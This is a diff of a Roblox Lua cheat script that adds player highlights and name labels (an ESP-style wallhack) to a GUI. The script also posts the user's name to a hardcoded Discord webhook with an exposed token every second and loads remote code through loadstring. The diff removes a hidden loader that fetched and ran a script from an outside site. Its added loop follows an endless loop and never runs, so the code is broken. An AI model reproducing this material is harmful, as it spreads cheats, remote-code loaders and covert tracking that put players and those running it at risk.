@@ -1,5 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 local webhookURL = "https://discord.com/api/webhooks/1256741821845995540/JwkpQiiXAJnL1trAFmzusTGJ6_1yczLYmUMf_s-hySF0jrlGWdUU_zjwK6uKdup7n4Sk"
 
 local function sendPlayerStatus(playerName)
@@ -22,9 +23,44 @@ local function sendPlayerStatus(playerName)
 	HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
 end
 
-coroutine.resume(coroutine.create(pcall), function()
-	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
-end)
+local function createTextLabel(character, playerName)
+	local head = character:FindFirstChild("Head")
+	if head then
+		local billboardGui = Instance.new("BillboardGui")
+		billboardGui.Adornee = head
+		billboardGui.Size = UDim2.new(1, 0, 1, 0)
+		billboardGui.StudsOffset = Vector3.new(0, 2, 0) -- Adjust height above the head
+
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Size = UDim2.new(1, 0, 1, 0)
+		textLabel.BackgroundTransparency = 1
+		textLabel.Text = playerName
+		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+		textLabel.TextStrokeTransparency = 0.5 -- Add stroke for readability
+
+		textLabel.Parent = billboardGui
+		billboardGui.Parent = Workspace
+	end
+end
+
+local function highlightTorso(character)
+	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
+	if torso then
+		-- Clear existing highlights to avoid duplicates
+		for _, child in ipairs(torso:GetChildren()) do
+			if child:IsA("Highlight") then
+				child:Destroy()
+			end
+		end
+
+		local highlight = Instance.new("Highlight")
+		highlight.Parent = torso
+		highlight.FillColor = Color3.fromRGB(0, 0, 255) -- Blue fill color
+		highlight.FillTransparency = 0.4 -- Transparency for fill
+		highlight.OutlineColor = Color3.fromRGB(255, 255, 0) -- Yellow outline color
+		highlight.OutlineTransparency = 0.3 -- Transparency for outline
+	end
+end
 
 local Rice = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
@@ -91,12 +127,9 @@ local playerName = game.Players.LocalPlayer.Name
 
 local function highlightPlayers()
 	for _, player in pairs(Players:GetPlayers()) do
-		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-			local highlight = Instance.new("Highlight")
-			highlight.Adornee = player.Character
-			highlight.FillColor = Color3.new(1, 0, 0)
-			highlight.OutlineColor = Color3.new(1, 1, 1)
-			highlight.Parent = player.Character
+		if player.Character then
+			highlightTorso(player.Character)
+			createTextLabel(player.Character, player.Name)
 		end
 	end
 end
@@ -144,4 +177,37 @@ loadstring(game:GetObjects('rbxassetid://15900013841')[1].Source)()
 while true do
 	wait(1)
 	sendPlayerStatus(playerName)
+end
+
+-- Connect PlayerAdded event
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(character)
+		highlightTorso(character)
+		createTextLabel(character, player.Name)
+	end)
+
+	-- Highlight existing character and create label if it exists
+	if player.Character then
+		highlightTorso(player.Character)
+		createTextLabel(player.Character, player.Name)
+	end
+end)
+
+-- Highlight existing players' torsos and create labels
+for _, player in ipairs(Players:GetPlayers()) do
+	if player.Character then
+		highlightTorso(player.Character)
+		createTextLabel(player.Character, player.Name)
+	end
+end
+
+-- Auto-refresh highlights and labels every 1 second
+while true do
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player.Character then
+			highlightTorso(player.Character)
+			createTextLabel(player.Character, player.Name)
+		end
+	end
+	wait(1)
 end
